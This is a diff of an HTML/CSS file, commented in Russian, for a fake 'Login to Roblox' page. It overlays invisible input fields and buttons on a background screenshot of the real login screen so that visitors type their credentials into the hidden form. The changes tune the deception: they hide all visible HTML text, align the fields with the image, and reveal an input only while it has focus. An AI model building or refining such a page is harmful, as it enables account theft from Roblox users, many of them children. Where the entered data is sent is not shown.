@@ -1,4 +1,4 @@
-!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
@@ -6,7 +6,6 @@
     <title>Login to Roblox</title>
     <style>
         body {
-            /* Фоновая картинка */
             background-image: url('https://www.image2url.com/r2/default/images/1788504855465-d1ad8ca9-c64f-4236-9d35-ee4c6b7de39f.png');
             background-size: cover;
             background-position: center;
@@ -14,29 +13,28 @@
             
             color: #ffffff;
             font-family: Arial, sans-serif;
-            
-            /* Выравнивание ровно по центру экрана */
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
+            overflow: hidden;
         }
 
         .auth-container {
-            background: transparent; /* Делаем форму прозрачной */
+            background: transparent;
             width: 100%;
-            max-width: 400px;         /* Ширина под размер центральной менюшки */
+            max-width: 410px;
             padding: 20px;
-            text-align: center;
+            margin-top: 45px; /* Сдвиг вниз ровно на уровень полей картинки */
             box-sizing: border-box;
         }
 
-        /* Скрываем тексты HTML, так как они уже нарисованы на картинке */
+        /* Полностью скрываем видимый текст HTML */
         h1, 
         .link-text, 
         .signup-text {
-            opacity: 0;
+            display: none;
         }
 
         form {
@@ -48,45 +46,50 @@
         /* Невидимые поля ввода поверх картинки */
         .input-control {
             width: 100%;
-            padding: 12px;
+            height: 42px;
             background: transparent;
-            border: 1px solid transparent;
-            border-radius: 4px;
+            border: none;
+            outline: none;
             color: #ffffff;
-            font-size: 14px;
+            font-size: 15px;
+            padding: 0 12px;
             box-sizing: border-box;
+            /* Сделай 0.2 вместо 0, если захочешь увидеть где поля во время подгонки */
+            opacity: 0; 
         }
 
         .input-control:focus {
-            outline: none;
-            background: rgba(255, 255, 255, 0.05); /* Легкий подсвет при клике */
+            opacity: 1; /* При клике мышкой поле станет видимым, чтобы было удобно вводить */
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 4px;
         }
 
-        /* Невидимые кликабельные кнопки */
+        /* Невидимая кнопка Log In */
         .btn-submit {
             width: 100%;
-            padding: 12px;
+            height: 42px;
             background: transparent;
             border: none;
-            color: transparent;
             cursor: pointer;
-            margin-top: 5px;
+            margin-top: 8px;
+            opacity: 0;
         }
 
         .secondary-actions {
             display: flex;
             flex-direction: column;
             gap: 10px;
-            margin-top: 40px;
+            margin-top: 60px; /* Отступ до нижних кнопок */
         }
 
+        /* Невидимые дополнительные кнопки */
         .btn-secondary {
             width: 100%;
-            padding: 10px;
+            height: 38px;
             background: transparent;
             border: none;
-            color: transparent;
             cursor: pointer;
+            opacity: 0;
         }
 
         .error-message {
